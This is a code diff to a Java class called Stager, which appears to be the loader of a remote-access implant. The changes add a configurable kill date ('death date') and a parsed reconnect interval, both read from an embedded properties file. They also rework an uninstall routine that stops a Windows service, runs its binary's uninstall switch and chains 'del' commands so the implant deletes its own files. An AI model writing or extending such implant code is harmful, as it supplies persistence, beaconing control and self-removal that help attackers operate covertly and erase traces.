@@ -58,8 +58,10 @@ import java.security.CodeSource;
 import java.security.Permissions;
 import java.security.ProtectionDomain;
 import java.security.cert.Certificate;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Date;
 import java.util.List;
 import java.util.Properties;
 
@@ -70,6 +72,10 @@ public class Stager extends ClassLoader {
 
     final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
     public static String serviceName = ""; 
+    public static final SimpleDateFormat CHECKIN_DATE_FORMAT = new SimpleDateFormat("MM/dd/yyyy--HH:mm");
+    public static final String DEATH_LABEL ="X";
+    public static final String STAG_PROP_FILE ="stg";
+
     
     /**
      * @param args the command line arguments
@@ -84,7 +90,7 @@ public class Stager extends ClassLoader {
         Properties localProperties = new Properties();
         Class localClass = Stager.class;
         
-        InputStream localInputStream = localClass.getResourceAsStream("/stg");
+        InputStream localInputStream = localClass.getResourceAsStream("/" + STAG_PROP_FILE);
         if (localInputStream != null) {
             localProperties.load(localInputStream);
             localInputStream.close();
@@ -108,8 +114,29 @@ public class Stager extends ClassLoader {
                 //Get sleep time if it exists
                 String sleepTime = localProperties.getProperty("Z", null);
                 if (sleepTime != null){
-                    aTimer.addReconnectTime(sleepTime);
+                    
+                    //Start the timer
+                    Long aLong = Long.parseLong(sleepTime );
+                    Date tmpDate = new Date( aLong ); 
+                    
+                    aTimer.addReconnectTime(tmpDate);
                 }
+                
+                //Get sleep time if it exists
+                String deathDateStr = localProperties.getProperty(DEATH_LABEL, null);
+                if (deathDateStr != null && !deathDateStr.isEmpty()){
+                    
+                    //Start the timer
+                    try {
+                        Long aLong = Long.parseLong(deathDateStr );
+                        Date tmpDate = new Date( aLong ); 
+
+                        aTimer.setDeathDate(tmpDate);
+                    } catch ( NumberFormatException ex ){
+                        ex = null;
+                    }
+                }
+                
                 
                 //Start timer
                 aTimer.run();
@@ -142,13 +169,18 @@ public class Stager extends ClassLoader {
 
     }
 
+    //==========================================================================
+    /**
+     * 
+     * @throws URISyntaxException 
+     */
     private static void uninstall() throws URISyntaxException {
         
         URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
         File theJarFile = new File( classUrl.toURI() ); 
         
         List<String> cleanupList = new ArrayList<String>();
-        if( !serviceName.isEmpty() ){
+        if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                     
             //Tell the service to stop and restart
             final List<String> strList = new ArrayList<String>();
@@ -199,11 +231,10 @@ public class Stager extends ClassLoader {
                 aSB.append("net stop \"").append(serviceName).append("\"");
 
                 if(theSvcPath != null ){
-                    aSB.append(" && \"").append(theSvcPath).append("\" /u");
+                    aSB.append(" && \"").append(theSvcPath).append("\" -u");
                     aSB.append(" && del \"").append(theSvcPath).append("\"");
                 }
-                aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");
-                
+                aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");                
 
                 cleanupList.add(aSB.toString());
                                
@@ -211,26 +242,25 @@ public class Stager extends ClassLoader {
                 ex = null;
             } catch (InterruptedException ex) {
                 ex = null;
+            }                 
+            
+            try{
+                Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
+                aProcess.waitFor();
+            } catch(IOException ex){            
+            } catch (InterruptedException ex) {
             }
-                       
 
         } else {
+            
+            Class stagerClass = Stager.class;
+            ClassLoader aClassLoader = stagerClass.getClassLoader();
            
-            //Stop the svc, Remove the reg entry, delete files
-            cleanupList.add("cmd.exe");
-            cleanupList.add("/c");            
-            cleanupList.add(" del "+ theJarFile.getAbsolutePath() );   
+            LoaderUtilities.unloadLibs( aClassLoader );
+            theJarFile.delete();
             
         }
-        
-        try{
-            Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
-            aProcess.waitFor();
-        } catch(IOException ex){            
-        } catch (InterruptedException ex) {
-        }
-        
-        
+
     }
     
     //========================================================================
@@ -315,8 +345,7 @@ public class Stager extends ClassLoader {
         } catch (Throwable localThrowable) {
             
             //Write to the byte stream then send back
-            localThrowable.printStackTrace();
-           
+            localThrowable.printStackTrace();           
             
         } finally {
             
@@ -348,6 +377,7 @@ public class Stager extends ClassLoader {
         }
         return tempInt;
 
-    }
+    }   
+   
 
 }
